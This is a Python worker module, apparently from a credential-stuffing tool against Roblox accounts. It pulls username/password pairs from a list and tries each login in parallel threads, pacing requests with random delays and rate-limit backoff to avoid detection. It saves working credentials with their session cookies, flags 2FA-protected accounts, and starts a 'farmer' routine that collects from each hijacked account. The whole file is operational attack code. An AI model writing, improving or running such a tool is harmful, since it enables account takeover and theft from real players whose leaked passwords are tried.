import random, threading, time

import config, farmer, rblx, store


class Gate:
    def __init__(self, lo, hi):
        self.lo, self.hi = lo, hi
        self._l = threading.Lock()
        self._next = 0.0

    def wait(self):
        with self._l:
            now = time.time()
            at = max(now, self._next)
            self._next = at + random.uniform(self.lo, self.hi)
        if at > now:
            time.sleep(at - now)

    def hold(self, secs):
        with self._l:
            self._next = max(self._next, time.time() + secs)


class Pool:
    def __init__(self, size, stop):
        self.size = max(1, size)
        self.stop = stop
        self.paused = True
        self.gate = Gate(config.MIN_DELAY, config.MAX_DELAY)

    def start(self):
        for i in range(self.size):
            threading.Thread(target=self._run, name="w%d" % i, daemon=True).start()

    def _run(self):
        cli = rblx.Roblox()
        try:
            cli.csrf()
        except Exception:
            pass
        while not self.stop.is_set():
            if self.paused:
                time.sleep(1.0)
                continue
            job = store.claim_combo()
            if not job:
                time.sleep(2.0)
                continue
            u, p = job["username"], job["password"]
            self.gate.wait()
            try:
                status, detail, cookie = cli.login(u, p)
            except Exception as e:
                status, detail, cookie = "error", repr(e), None

            if status in ("ratelimited", "csrf", "error"):
                store.finish_combo(u, p, "pending", detail)
                if status == "ratelimited":
                    try:
                        self.gate.hold(min(300.0, float(detail) + 5))
                    except Exception:
                        self.gate.hold(60)
                continue

            if status == "hit":
                store.add_hit(u, p, cookie)
                store.finish_combo(u, p, "hit", "ok")
                threading.Thread(target=_farm, args=(u, cookie), daemon=True).start()
            elif status == "2fa":
                store.finish_combo(u, p, "2fa", detail)
                store.add_hit(u, p, cookie, "2fa")
            else:
                store.finish_combo(u, p, status, detail)


def _farm(u, cookie):
    try:
        farmer.collect(u, cookie)
    except Exception:
        pass
